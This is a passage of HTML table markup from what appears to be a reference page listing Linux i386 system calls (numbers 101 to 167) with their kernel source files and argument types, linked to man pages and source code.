href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/ioport.c" target="_blank" rel="noopener">arch/i386/kernel/ioport.c</a></td><td>unsigned long</td><td>unsigned long</td><td>int</td><td>-</td><td>-</td></tr><tr><td>102</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/socketcall.2.html" target="_blank" rel="noopener">sys_socketcall</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/net/socket.c" target="_blank" rel="noopener">net/socket.c</a></td><td>int</td><td>unsigned long *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>103</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/syslog.2.html" target="_blank" rel="noopener">sys_syslog</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/printk.c" target="_blank" rel="noopener">kernel/printk.c</a></td><td>int</td><td>char *</td><td>int</td><td>-</td><td>-</td></tr><tr><td>104</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/setitimer.2.html" target="_blank" rel="noopener">sys_setitimer</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/itimer.c" target="_blank" rel="noopener">kernel/itimer.c</a></td><td>int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#itimerval" target="_blank" rel="noopener">struct itimerval *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#itimerval" target="_blank" rel="noopener">struct itimerval *</a></td><td>-</td><td>-</td></tr><tr><td>105</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/getitimer.2.html" target="_blank" rel="noopener">sys_getitimer</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/itimer.c" target="_blank" rel="noopener">kernel/itimer.c</a></td><td>int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#itimerval" target="_blank" rel="noopener">struct itimerval *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>106</td><td>sys_newstat</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/stat.c" target="_blank" rel="noopener">fs/stat.c</a></td><td>char *</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#stat" target="_blank" rel="noopener">struct stat *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>107</td><td>sys_newlstat</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/stat.c" target="_blank" rel="noopener">fs/stat.c</a></td><td>char *</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#stat" target="_blank" rel="noopener">struct stat *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>108</td><td>sys_newfstat</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/stat.c" target="_blank" rel="noopener">fs/stat.c</a></td><td>unsigned int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#stat" target="_blank" rel="noopener">struct stat *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>109</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/uname.2.html" target="_blank" rel="noopener">sys_uname</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/sys_i386.c" target="_blank" rel="noopener">arch/i386/kernel/sys_i386.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#old_utsname" target="_blank" rel="noopener">struct old_utsname *</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>110</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/iopl.2.html" target="_blank" rel="noopener">sys_iopl</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/ioport.c" target="_blank" rel="noopener">arch/i386/kernel/ioport.c</a></td><td>unsigned long</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>111</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/vhangup.2.html" target="_blank" rel="noopener">sys_vhangup</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/open.c" target="_blank" rel="noopener">fs/open.c</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>112</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/idle.2.html" target="_blank" rel="noopener">sys_idle</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/process.c" target="_blank" rel="noopener">arch/i386/kernel/process.c</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>113</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/vm86.2.html" target="_blank" rel="noopener">sys_vm86old</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/vm86.c" target="_blank" rel="noopener">arch/i386/kernel/vm86.c</a></td><td>unsigned long</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#vm86plus_struct" target="_blank" rel="noopener">struct vm86plus_struct *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>114</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/wait4.2.html" target="_blank" rel="noopener">sys_wait4</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/exit.c" target="_blank" rel="noopener">kernel/exit.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#pid_t" target="_blank" rel="noopener">pid_t</a></td><td>unsigned long *</td><td>int options</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#rusage" target="_blank" rel="noopener">struct rusage *</a></td><td>-</td></tr><tr><td>115</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/swapoff.2.html" target="_blank" rel="noopener">sys_swapoff</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/mm/swapfile.c" target="_blank" rel="noopener">mm/swapfile.c</a></td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>116</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/sysinfo.2.html" target="_blank" rel="noopener">sys_sysinfo</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/info.c" target="_blank" rel="noopener">kernel/info.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#sysinfo" target="_blank" rel="noopener">struct sysinfo *</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>117</td><td>sys_ipc<a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#note117" target="_blank" rel="noopener">(*Note)</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/sys_i386.c" target="_blank" rel="noopener">arch/i386/kernel/sys_i386.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#uint" target="_blank" rel="noopener">uint</a></td><td>int</td><td>int</td><td>int</td><td>void *</td></tr><tr><td>118</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/fsync.2.html" target="_blank" rel="noopener">sys_fsync</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/buffer.c" target="_blank" rel="noopener">fs/buffer.c</a></td><td>unsigned int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>119</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/sigreturn.2.html" target="_blank" rel="noopener">sys_sigreturn</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/signal.c" target="_blank" rel="noopener">arch/i386/kernel/signal.c</a></td><td>unsigned long</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>120</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/clone.2.html" target="_blank" rel="noopener">sys_clone</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/process.c" target="_blank" rel="noopener">arch/i386/kernel/process.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#pt_regs" target="_blank" rel="noopener">struct pt_regs</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>121</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/setdomainname.2.html" target="_blank" rel="noopener">sys_setdomainname</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td>char *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>122</td><td>sys_newuname</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#new_utsname" target="_blank" rel="noopener">struct new_utsname *</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>123</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/modify_ldt.2.html" target="_blank" rel="noopener">sys_modify_ldt</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/ldt.c" target="_blank" rel="noopener">arch/i386/kernel/ldt.c</a></td><td>int</td><td>void *</td><td>unsigned long</td><td>-</td><td>-</td></tr><tr><td>124</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/adjtimex.2.html" target="_blank" rel="noopener">sys_adjtimex</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/time.c" target="_blank" rel="noopener">kernel/time.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#timex" target="_blank" rel="noopener">struct timex *</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>125</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/mprotect.2.html" target="_blank" rel="noopener">sys_mprotect</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/mm/mprotect.c" target="_blank" rel="noopener">mm/mprotect.c</a></td><td>unsigned long</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>unsigned long</td><td>-</td><td>-</td></tr><tr><td>126</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/sigprocmask.2.html" target="_blank" rel="noopener">sys_sigprocmask</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/signal.c" target="_blank" rel="noopener">kernel/signal.c</a></td><td>int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#old_sigset_t" target="_blank" rel="noopener">old_sigset_t *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#old_sigset_t" target="_blank" rel="noopener">old_sigset_t *</a></td><td>-</td><td>-</td></tr><tr><td>127</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/create_module.2.html" target="_blank" rel="noopener">sys_create_module</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/module.c" target="_blank" rel="noopener">kernel/module.c</a></td><td>const char *</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>128</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/init_module.2.html" target="_blank" rel="noopener">sys_init_module</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/module.c" target="_blank" rel="noopener">kernel/module.c</a></td><td>const char *</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#module" target="_blank" rel="noopener">struct module *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>129</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/delete_module.2.html" target="_blank" rel="noopener">sys_delete_module</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/module.c" target="_blank" rel="noopener">kernel/module.c</a></td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>130</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/get_kernel_syms.2.html" target="_blank" rel="noopener">sys_get_kernel_syms</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/module.c" target="_blank" rel="noopener">kernel/module.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#kernel_sym" target="_blank" rel="noopener">struct kernel_sym *</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>131</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/quotactl.2.html" target="_blank" rel="noopener">sys_quotactl</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/dquot.c" target="_blank" rel="noopener">fs/dquot.c</a></td><td>int</td><td>const char *</td><td>int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#caddr_t" target="_blank" rel="noopener">caddr_t</a></td><td>-</td></tr><tr><td>132</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/getpgid.2.html" target="_blank" rel="noopener">sys_getpgid</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#pid_t" target="_blank" rel="noopener">pid_t</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>133</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/fchdir.2.html" target="_blank" rel="noopener">sys_fchdir</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/open.c" target="_blank" rel="noopener">fs/open.c</a></td><td>unsigned int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>134</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/bdflush.2.html" target="_blank" rel="noopener">sys_bdflush</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/buffer.c" target="_blank" rel="noopener">fs/buffer.c</a></td><td>int</td><td>long</td><td>-</td><td>-</td><td>-</td></tr><tr><td>135</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/sysfs.2.html" target="_blank" rel="noopener">sys_sysfs</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/super.c" target="_blank" rel="noopener">fs/super.c</a></td><td>int</td><td>unsigned long</td><td>unsigned long</td><td>-</td><td>-</td></tr><tr><td>136</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/personality.2.html" target="_blank" rel="noopener">sys_personality</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/exec_domain.c" target="_blank" rel="noopener">kernel/exec_domain.c</a></td><td>unsigned long</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>138</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/setfsuid.2.html" target="_blank" rel="noopener">sys_setfsuid</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#uid_t" target="_blank" rel="noopener">uid_t</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>139</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/setfsgid.2.html" target="_blank" rel="noopener">sys_setfsgid</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#gid_t" target="_blank" rel="noopener">gid_t</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>140</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/llseek.2.html" target="_blank" rel="noopener">sys_llseek</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/read_write.c" target="_blank" rel="noopener">fs/read_write.c</a></td><td>unsigned int</td><td>unsigned long</td><td>unsigned long</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#loff_t" target="_blank" rel="noopener">loff_t *</a></td><td>unsigned int</td></tr><tr><td>141</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/getdents.2.html" target="_blank" rel="noopener">sys_getdents</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/readdir.c" target="_blank" rel="noopener">fs/readdir.c</a></td><td>unsigned int</td><td>void *</td><td>unsigned int</td><td>-</td><td>-</td></tr><tr><td>142</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/select.2.html" target="_blank" rel="noopener">sys_select</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/select.c" target="_blank" rel="noopener">fs/select.c</a></td><td>int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#fd_set" target="_blank" rel="noopener">fd_set *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#fd_set" target="_blank" rel="noopener">fd_set *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#fd_set" target="_blank" rel="noopener">fd_set *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#timeval" target="_blank" rel="noopener">struct timeval *</a></td></tr><tr><td>143</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/flock.2.html" target="_blank" rel="noopener">sys_flock</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/locks.c" target="_blank" rel="noopener">fs/locks.c</a></td><td>unsigned int</td><td>unsigned int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>144</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/msync.2.html" target="_blank" rel="noopener">sys_msync</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/mm/filemap.c" target="_blank" rel="noopener">mm/filemap.c</a></td><td>unsigned long</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>int</td><td>-</td><td>-</td></tr><tr><td>145</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/readv.2.html" target="_blank" rel="noopener">sys_readv</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/read_write.c" target="_blank" rel="noopener">fs/read_write.c</a></td><td>unsigned long</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#iovec" target="_blank" rel="noopener">const struct iovec *</a></td><td>unsigned long</td><td>-</td><td>-</td></tr><tr><td>146</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/writev.2.html" target="_blank" rel="noopener">sys_writev</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/read_write.c" target="_blank" rel="noopener">fs/read_write.c</a></td><td>unsigned long</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#iovec" target="_blank" rel="noopener">const struct iovec *</a></td><td>unsigned long</td><td>-</td><td>-</td></tr><tr><td>147</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/getsid.2.html" target="_blank" rel="noopener">sys_getsid</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#pid_t" target="_blank" rel="noopener">pid_t</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>148</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/fdatasync.2.html" target="_blank" rel="noopener">sys_fdatasync</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/buffer.c" target="_blank" rel="noopener">fs/buffer.c</a></td><td>unsigned int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>149</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/sysctl.2.html" target="_blank" rel="noopener">sys_sysctl</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sysctl.c" target="_blank" rel="noopener">kernel/sysctl.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#__sysctl_args" target="_blank" rel="noopener">struct __sysctl_args *</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>150</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/mlock.2.html" target="_blank" rel="noopener">sys_mlock</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/mm/mlock.c" target="_blank" rel="noopener">mm/mlock.c</a></td><td>unsigned long</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>151</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/munlock.2.html" target="_blank" rel="noopener">sys_munlock</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/mm/mlock.c" target="_blank" rel="noopener">mm/mlock.c</a></td><td>unsigned long</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>152</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/mlockall.2.html" target="_blank" rel="noopener">sys_mlockall</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/mm/mlock.c" target="_blank" rel="noopener">mm/mlock.c</a></td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>153</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/munlockall.2.html" target="_blank" rel="noopener">sys_munlockall</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/mm/mlock.c" target="_blank" rel="noopener">mm/mlock.c</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>154</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/sched_setparam.2.html" target="_blank" rel="noopener">sys_sched_setparam</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sched.c" target="_blank" rel="noopener">kernel/sched.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#pid_t" target="_blank" rel="noopener">pid_t</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#sched_param" target="_blank" rel="noopener">struct sched_param *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>155</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/sched_getparam.2.html" target="_blank" rel="noopener">sys_sched_getparam</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sched.c" target="_blank" rel="noopener">kernel/sched.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#pid_t" target="_blank" rel="noopener">pid_t</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#sched_param" target="_blank" rel="noopener">struct sched_param *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>156</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/sched_setscheduler.2.html" target="_blank" rel="noopener">sys_sched_setscheduler</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sched.c" target="_blank" rel="noopener">kernel/sched.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#pid_t" target="_blank" rel="noopener">pid_t</a></td><td>int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#sched_param" target="_blank" rel="noopener">struct sched_param *</a></td><td>-</td><td>-</td></tr><tr><td>157</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/sched_getscheduler.2.html" target="_blank" rel="noopener">sys_sched_getscheduler</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sched.c" target="_blank" rel="noopener">kernel/sched.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#pid_t" target="_blank" rel="noopener">pid_t</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>158</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/sched_yield.2.html" target="_blank" rel="noopener">sys_sched_yield</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sched.c" target="_blank" rel="noopener">kernel/sched.c</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>159</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/sched_get_priority_max.2.html" target="_blank" rel="noopener">sys_sched_get_priority_max</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sched.c" target="_blank" rel="noopener">kernel/sched.c</a></td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>160</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/sched_get_priority_min.2.html" target="_blank" rel="noopener">sys_sched_get_priority_min</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sched.c" target="_blank" rel="noopener">kernel/sched.c</a></td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>161</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/sched_rr_get_interval.2.html" target="_blank" rel="noopener">sys_sched_rr_get_interval</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sched.c" target="_blank" rel="noopener">kernel/sched.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#pid_t" target="_blank" rel="noopener">pid_t</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#timespec" target="_blank" rel="noopener">struct timespec *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>162</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/nanosleep.2.html" target="_blank" rel="noopener">sys_nanosleep</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sched.c" target="_blank" rel="noopener">kernel/sched.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#timespec" target="_blank" rel="noopener">struct timespec *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#timespec" target="_blank" rel="noopener">struct timespec *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>163</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/mremap.2.html" target="_blank" rel="noopener">sys_mremap</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/mm/mremap.c" target="_blank" rel="noopener">mm/mremap.c</a></td><td>unsigned long</td><td>unsigned long</td><td>unsigned long</td><td>unsigned long</td><td>-</td></tr><tr><td>164</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/setresuid.2.html" target="_blank" rel="noopener">sys_setresuid</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#uid_t" target="_blank" rel="noopener">uid_t</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#uid_t" target="_blank" rel="noopener">uid_t</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#uid_t" target="_blank" rel="noopener">uid_t</a></td><td>-</td><td>-</td></tr><tr><td>165</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/getresuid.2.html" target="_blank" rel="noopener">sys_getresuid</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#uid_t" target="_blank" rel="noopener">uid_t *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#uid_t" target="_blank" rel="noopener">uid_t *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#uid_t" target="_blank" rel="noopener">uid_t *</a></td><td>-</td><td>-</td></tr><tr><td>166</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/vm86.2.html" target="_blank" rel="noopener">sys_vm86</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/vm86.c" target="_blank" rel="noopener">arch/i386/kernel/vm86.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#vm86_struct" target="_blank" rel="noopener">struct vm86_struct *</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>167</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/query_module.2.html" target="_blank" rel="noopener">sys_query_module</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/module.c" target="_blank" rel="noopener">kernel/module.c</a></td><td>const char *</td><td>int</td><td>char *</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#size_t" target="_blank" rel="noopener">size_t</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#size_t" target="_blank" rel="noopener">size_t 